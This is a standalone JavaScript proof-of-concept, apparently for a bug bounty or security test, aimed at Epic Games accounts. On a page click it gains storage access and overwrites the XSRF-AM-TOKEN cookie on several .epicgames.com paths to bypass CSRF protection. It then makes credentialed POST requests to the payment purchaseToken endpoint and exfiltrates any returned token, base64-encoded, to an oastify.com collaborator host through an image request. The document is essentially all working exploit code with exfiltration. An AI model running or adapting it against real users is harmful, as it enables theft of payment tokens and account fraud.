(function() {
  document.onclick = function() {
    document.requestStorageAccess().then(function() {
      console.log('Storage access granted!');
      
      var xsrf = '';
      for (var i = 0; i < 32; i++) {
        xsrf += Math.floor(Math.random() * 16).toString(16);
      }
      console.log('Our XSRF:', xsrf);
      
      // Set cookie on MORE SPECIFIC path so it comes FIRST
      document.cookie = 'XSRF-AM-TOKEN=' + xsrf + '; Path=/account/v2/payment/purchaseToken; Domain=.epicgames.com';
      document.cookie = 'XSRF-AM-TOKEN=' + xsrf + '; Path=/account/v2/payment; Domain=.epicgames.com';
      document.cookie = 'XSRF-AM-TOKEN=' + xsrf + '; Path=/account/v2; Domain=.epicgames.com';
      document.cookie = 'XSRF-AM-TOKEN=' + xsrf + '; Path=/account; Domain=.epicgames.com';
      
      console.log('Cookies set on multiple paths');
      
      fetch('https://www.epicgames.com/account/v2/refresh-csrf', {
        method: 'POST',
        credentials: 'include'
      })
      .then(function() {
        return fetch('https://www.epicgames.com/account/v2/payment/purchaseToken?locale=en-US', {
          method: 'POST',
          credentials: 'include',
          headers: {
            'Content-Type': 'application/json',
            'X-Xsrf-Token': xsrf,
            'X-Requested-With': 'XMLHttpRequest'
          },
          body: JSON.stringify({
            "currentLocation": "https://www.epicgames.com/account/payments",
            "flow": "PAYMENT_MANAGEMENT",
            "flow_id": "account_management_prod",
            "flow_name": "",
            "solve_token": ""
          })
        });
      })
      .then(function(res) {
        console.log('Status:', res.status);
        return res.json();
      })
      .then(function(data) {
        console.log('Response:', JSON.stringify(data));
        if (data.purchaseToken) {
          console.log('TOKEN:', data.purchaseToken);
          new Image().src = 'https://itfyjvb10btewzys9nunumsy9pfg380wp.oastify.com/?token=' + btoa(data.purchaseToken);
        }
      })
      .catch(function(e) {
        console.error('Error:', e);
      });
    });
  };
  console.log('CLICK THE PAGE');
})();
